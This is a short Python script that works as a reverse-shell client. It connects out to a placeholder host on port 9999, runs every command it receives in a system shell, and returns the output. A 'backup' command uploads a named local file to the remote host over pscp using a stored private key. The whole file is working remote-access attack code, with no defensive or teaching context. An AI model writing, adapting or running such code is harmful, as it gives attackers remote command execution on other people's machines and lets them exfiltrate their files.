import os
import socket
import subprocess
import sys

s = socket.socket()
host_name = 'WebsiteNameHere.com'
host = socket.gethostbyname(host_name)  #Or directly input IP address here
port = 9999         #Same port as defined by server
s.connect((host, port))

while True:
    try:
        data = s.recv(1024)

        if data[:6].decode("utf-8") == 'backup':
            filename = data[7:].decode("utf-8")
            d_current = os.getcwd()
            d_key = os.path.abspath(os.path.dirname(sys.argv[0]))
            sshID = "ubuntu@" + host_name
            data = "pscp -i " + str(d_key) + "\PrivateKeyFile.ppk " + str(d_current) + "\\" + filename + " " + sshID +\
                   ":/home/ubuntu/" + filename
            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            outputStr = str(cmd.stdout.read() + cmd.stderr.read(), "utf-8")
            s.send(str.encode(outputStr + str(os.getcwd()) + '> '))

        else:
            if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8"))
                data = ''.encode("utf-8")

            if len(data) >= 0:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
                outputStr = str(cmd.stdout.read() + cmd.stderr.read(), "utf-8")
                s.send(str.encode(outputStr + str(os.getcwd())+'> '))
                # print(outputStr)
    except:
        break
